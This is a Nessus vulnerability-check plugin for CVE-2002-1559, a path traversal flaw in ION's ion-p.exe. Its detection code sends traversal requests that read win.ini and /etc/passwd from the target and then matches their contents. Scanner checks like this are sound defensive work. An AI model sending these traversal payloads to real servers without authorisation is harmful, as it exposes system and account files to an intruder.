#
# This script was written by John Lampe...j_lampe@bellsouth.net 
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/16/009)


include("compat.inc");

if(description)
{
 script_id(11729);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2002-1559");
 script_bugtraq_id(6091);
 script_xref(name:"OSVDB", value:"6661");
 
 script_name(english:"ION ion-p.exe page Parameter Traversal Arbitrary File Retrieval");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting an application that is affected by
an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The ion-p.exe exists on this webserver. Some versions of this file are
vulnerable to remote exploit. An attacker, exploiting this 
vulnerability, may be able to gain access to confidential data and/or
escalate their privileges on the web server." );
 script_set_attribute(attribute:"see_also", value:"http://marc.theaimsgroup.com/?l=bugtraq&m=103617461516386&w=2" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 script_summary(english:"Checks for the ion-p.exe file");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 John Lampe");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

flag = 0;
directory = "";

foreach dir (cgi_dirs()) {
	req = http_get(item: dir + "/ion-p.exe?page=c:\\winnt\\win.ini", port:port);
	res = http_keepalive_send_recv(port:port, data:req);
	if( res == NULL ) exit(0);
	
	if (egrep(pattern:".*\[fonts\].*", string:res, icase:TRUE)) {
			security_warning(port);
			exit(0);
		}
		
	req = http_get(item: dir + "/ion-p.exe?page=../../../../../etc/passwd", port:port);
	res = http_keepalive_send_recv(port:port, data:req);
	if (egrep(pattern:".*root:.*:0:[01]:.*", string:res)) 
	{
	 security_warning(port);
	 exit(0);
	}
}
